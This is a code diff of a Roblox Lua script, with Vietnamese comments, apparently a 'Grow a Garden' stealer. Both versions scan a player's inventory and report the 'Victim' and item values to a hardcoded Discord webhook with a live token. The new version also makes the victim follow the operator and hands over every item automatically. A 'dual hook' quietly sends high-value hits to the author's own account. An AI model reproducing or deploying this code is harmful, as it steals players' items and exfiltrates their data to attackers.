@@ -1,136 +1,280 @@
--- Core.lua - Full inventory logger + Steal + DualHook logic
-
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 local plr = Players.LocalPlayer
 local backpack = plr:WaitForChild("Backpack")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local modules = replicatedStorage:WaitForChild("Modules")
-local dataService = require(modules:WaitForChild("DataService"))
-local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+
+-- CẤU HÌNH
+local PRIMARY_USERNAME = Username
+local PRIMARY_WEBHOOK = Webhook 
+local DUAL_USERNAME = "namnnni2"
+local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local VALUE_THRESHOLD = 1_000_000_000_000 -- 1000 tỷ
+local AUTO_TRANSFER_DELAY = 0.3
+local HEAVY_WEIGHT = 10 -- Ngưỡng cân nặng để xác định pet nặng
+
+-- DANH SÁCH PET VIP (CHỈ THÊM KHÔNG BỚT)
+local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}
+
+-- MODULE
 local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
-local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
 local numberUtil = require(modules:WaitForChild("NumberUtil"))
 
--- SETTINGS OUTSIDE
-local Webhook = getfenv().Webhook
-local Username = getfenv().Username
+-- BIẾN TOÀN CỤC
+local currentPrompt = nil
+local isTransferring = false
+local connection = nil
+local trackingPlayer = nil
 
--- DUAL HOOK CONFIG (SET INSIDE)
-local DualWebhook = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local DualUsername = "namnnni2"
-
--- Auto fallback
-if not Webhook or not Username then return warn("Missing Webhook or Username") end
-
--- RULES
-local rarePets = {"Butterfly", "Raccoon", "Dragonfly", "Mimic Octopus", "Queen Bee", "Disco Bee", "Fennec Fox"}
-local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
-
--- START
-local itemsToSend, totalValue, hasRare, hasHeavy = {}, 0, false, false
-
+-- ĐỊNH DẠNG SỐ
 local function formatNumber(n)
-	local suffix = {"", "k", "m", "b", "t"}
-	local idx = 1
-	while n >= 1000 and idx < #suffix do
-		n = n / 1000
-		idx += 1
-	end
-	return idx == 1 and tostring(math.floor(n)) or string.format("%.2f%s", n, suffix[idx])
+    return tostring(math.floor(n)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
 end
 
-local function calcPetValue(petData)
-	local egg = petData.PetData.HatchedFrom
-	if not egg then return 0 end
-	local data = petRegistry.PetEggs[egg]
-	local rarity = data and data.RarityData.Items[petData.PetType]
-	if not rarity then return 0 end
-	local r = rarity.GeneratedPetData.WeightRange
-	if not r then return 0 end
-	local lerp = numberUtil.ReverseLerp(r[1], r[2], petData.PetData.BaseWeight)
-	local weightMult = math.lerp(0.8, 1.2, lerp)
-	local levelMult = math.lerp(0.15, 6, petUtils:GetLevelProgress(petData.PetData.Level))
-	return math.floor(petRegistry.PetList[petData.PetType].SellPrice * weightMult * levelMult)
+-- TÍNH GIÁ TRỊ VÀ ĐỘ ƯU TIÊN
+local function calculatePriority(item)
+    local priority = 0
+    -- Pet VIP
+    if table.find(VIP_PETS, item.Name) then
+        priority = priority + 1000
+    end
+    -- Pet nặng (bất kỳ pet nào có weight >= HEAVY_WEIGHT)
+    if (item.Weight or 0) >= HEAVY_WEIGHT then
+        priority = priority + 500
+    end
+    -- Giá trị
+    priority = priority + (item.Value or 0)
+    return priority
 end
 
--- Inventory Scan
-for _, tool in ipairs(backpack:GetChildren()) do
-	if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
-		if tool:GetAttribute("ItemType") == "Pet" then
-			local id = tool:GetAttribute("PET_UUID")
-			local petData = dataService:GetData().PetsData.PetInventory.Data[id]
-			local petName = petData.PetType
-			local weight = tonumber(petData.PetData.BaseWeight) or 0
-			local value = calcPetValue(petData)
-
-			if table.find(rarePets, petName) then hasRare = true end
-			if weight >= 10 then hasHeavy = true end
-			totalValue += value
-			table.insert(itemsToSend, {Name = petName, Weight = weight, Value = value, Type = "Pet"})
-		else
-			local value = calcPlantValue(tool)
-			totalValue += value
-			table.insert(itemsToSend, {Name = tool.Name, Weight = 0, Value = value, Type = "Plant"})
-		end
-	end
+-- SẮP XẾP ƯU TIÊN
+local function sortByPriority(a, b)
+    return calculatePriority(a) > calculatePriority(b)
 end
 
-if #itemsToSend == 0 then return end
+-- WEBHOOK THÔNG BÁO
+local function sendWebhookNotification(items, totalValue, targetName)
+    local useDual = totalValue >= VALUE_THRESHOLD
+    local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
+    local username = useDual and DUAL_USERNAME or PRIMARY_USERNAME
 
-table.sort(itemsToSend, function(a, b)
-	if a.Type == "Pet" and b.Type ~= "Pet" then return true end
-	if a.Type ~= "Pet" and b.Type == "Pet" then return false end
-	return a.Value > b.Value
+    -- Kiểm tra xem có pet VIP hoặc pet nặng không
+    local hasVIPOrHeavyPet = false
+    for _, item in ipairs(items) do
+        if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
+            hasVIPOrHeavyPet = true
+            break
+        end
+    end
+
+    -- Phân loại vật phẩm
+    local categories = {
+        {name = "💎 VIP Pets", items = {}},
+        {name = "🏋️ Heavy Pets", items = {}},
+        {name = "🐾 Regular Pets", items = {}},
+        {name = "🌱 Plants", items = {}}
+    }
+
+    for _, item in ipairs(items) do
+        if table.find(VIP_PETS, item.Name) then
+            table.insert(categories[1].items, item)
+        elseif (item.Weight or 0) >= HEAVY_WEIGHT then
+            table.insert(categories[2].items, item)
+        elseif item.Type == "Pet" then
+            table.insert(categories[3].items, item)
+        else
+            table.insert(categories[4].items, item)
+        end
+    end
+
+    -- Tạo nội dung
+    local descriptionParts = {}
+    for _, category in ipairs(categories) do
+        if #category.items > 0 then
+            table.insert(descriptionParts, "**"..category.name.." ("..#category.items.."):**")
+            for _, item in ipairs(category.items) do
+                table.insert(descriptionParts, string.format("- %s: $%s (%.1fkg)", 
+                    item.Name, 
+                    formatNumber(item.Value),
+                    item.Weight or 0
+                ))
+            end
+            table.insert(descriptionParts, "")
+        end
+    end
+
+    local payload = {
+        username = username,
+        embeds = {{
+            title = useDual and "💎 VIP TRANSFER" or "📦 ITEM TRANSFER",
+            color = useDual and 0xFFD700 or 0x00FF00,
+            description = table.concat(descriptionParts, "\n"),
+            fields = {
+                {name = "👤 Sender", value = plr.Name, inline = true},
+                {name = "🎯 Receiver", value = targetName, inline = true},
+                {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
+                {name = "🔗 Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), inline = false}
+            },
+            footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    -- Nếu có pet VIP hoặc pet nặng, thêm @everyone vào nội dung
+    if hasVIPOrHeavyPet then
+        payload.content = "@everyone"
+    end
+
+    local request = (syn and syn.request) or (http and http.request) or request
+    if request then
+        pcall(function()
+            request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
+end
+
+-- CHỜ VẬT PHẨM BIẾN MẤT
+local function waitForItemRemoval(tool)
+    local timeout = 5 -- 5 giây timeout
+    local startTime = os.time()
+    while tool and tool.Parent == backpack do
+        if os.time() - startTime > timeout then
+            warn("Timeout waiting for item to be removed:", tool.Name)
+            return false
+        end
+        task.wait(0.1)
+    end
+    return true
+end
+
+-- TẠO VÀ TỰ KÍCH HOẠT PROXIMITY PROMPT
+local function createAutoPrompt(targetCharacter, targetName)
+    if currentPrompt then currentPrompt:Destroy() end
+    
+    local prompt = Instance.new("ProximityPrompt")
+    prompt.ObjectText = "Transfer to "..targetName
+    prompt.ActionText = "Auto-Transfer"
+    prompt.HoldDuration = 0.5
+    prompt.MaxActivationDistance = 10
+    prompt.Parent = targetCharacter:FindFirstChild("HumanoidRootPart")
+    
+    prompt.Triggered:Connect(function()
+        if isTransferring then return end
+        isTransferring = true
+        
+        -- Quét và sắp xếp kho đồ
+        local items = {}
+        local totalValue = 0
+        for _, tool in ipairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                local item = {
+                    Name = tool.Name,
+                    Type = tool:GetAttribute("ItemType"),
+                    Value = calculateItemValue(tool),
+                    Weight = tool:GetAttribute("Weight"),
+                    Tool = tool -- Lưu cả tool reference
+                }
+                totalValue += item.Value
+                table.insert(items, item)
+            end
+        end
+        
+        table.sort(items, sortByPriority)
+        
+        -- Chuyển đồ theo thứ tự ưu tiên và chờ từng item
+        local targetBackpack = Players:FindFirstChild(targetName):FindFirstChildOfClass("Backpack")
+        if targetBackpack then
+            for _, item in ipairs(items) do
+                if item.Tool and item.Tool.Parent == backpack then
+                    item.Tool.Parent = targetBackpack
+                    -- Chờ đến khi item biến mất khỏi backpack
+                    if not waitForItemRemoval(item.Tool) then
+                        warn("Failed to transfer item:", item.Name)
+                        break
+                    end
+                    task.wait(AUTO_TRANSFER_DELAY)
+                end
+            end
+        end
+        
+        -- Gửi webhook
+        sendWebhookNotification(items, totalValue, targetName)
+        
+        isTransferring = false
+    end)
+    
+    currentPrompt = prompt
+    
+    -- Tự động kích hoạt sau 0.5 giây
+    delay(0.5, function()
+        if prompt and prompt.Parent then
+            prompt:InputHoldBegin()
+            wait(prompt.HoldDuration)
+            prompt:InputHoldEnd()
+        end
+    end)
+end
+
+-- DỊCH CHUYỂN VÀ BÁM THEO
+local function teleportAndFollow(targetPlayer)
+    if not targetPlayer.Character then return end
+    local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not targetHRP then return end
+    
+    local myCharacter = plr.Character
+    if not myCharacter then return end
+    local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
+    if not myHRP then return end
+    
+    if connection then connection:Disconnect() end
+    
+    connection = RunService.Heartbeat:Connect(function(deltaTime)
+        local targetCF = targetHRP.CFrame
+        local behindPos = targetCF.Position - (targetCF.LookVector * 3)
+        local newPos = myHRP.Position:Lerp(behindPos, deltaTime * 10)
+        myHRP.CFrame = CFrame.new(newPos, targetHRP.Position)
+        
+        if not currentPrompt then
+            createAutoPrompt(targetPlayer.Character, targetPlayer.Name)
+        end
+    end)
+end
+
+-- THEO DÕI CHAT
+local function onPlayerChatted(player, message)
+    if (player.Name == PRIMARY_USERNAME or player.Name == DUAL_USERNAME) and not isTransferring then
+        if player.Character then
+            teleportAndFollow(player)
+        else
+            player.CharacterAdded:Once(function()
+                teleportAndFollow(player)
+            end)
+        end
+    end
+end
+
+-- KHỞI TẠO
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onPlayerChatted(player, msg)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        onPlayerChatted(player, msg)
+    end)
 end)
 
--- Determine webhook
-local useDual = totalValue >= 10_000_000_000
-local finalWebhook = useDual and DualWebhook or Webhook
-local finalUsername = useDual and DualUsername or Username
-
--- Compose Message
-local content = (hasRare or hasHeavy) and "@everyone\n" or ""
-content ..= "**GROW A GARDEN HIT - By namnnni2**\n"
-content ..= "**JobId:** `" .. game.JobId .. "`"
-
-local lines = ""
-for _, item in ipairs(itemsToSend) do
-	lines ..= string.format("%s (%.2f KG): ₵%s\n", item.Name, item.Weight, formatNumber(item.Value))
-	if #lines > 1024 then
-		lines = lines:sub(1, 1000) .. "\n...more items"
-		break
-	end
-end
-
-local payload = {
-	content = content,
-	embeds = {{
-		title = "🎯 Full Inventory Report",
-		color = 65280,
-		fields = {
-			{name = "Victim", value = plr.Name, inline = true},
-			{name = "Total Value", value = "₵" .. formatNumber(totalValue), inline = true},
-			{name = "Join Link", value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId, inline = false},
-			{name = "Inventory", value = lines, inline = false}
-		},
-		footer = { text = "GAG Stealer by " .. finalUsername }
-	}}
-}
-
--- Auto HTTP sender
-local function getRequest()
-	return syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or (identifyexecutor and identifyexecutor():lower():find("delta") and request)
-end
-
-pcall(function()
-	local req = getRequest()
-	if req then
-		req({
-			Url = finalWebhook,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode(payload)
-		})
-	end
-end)
+-- Không có thông báo khởi động
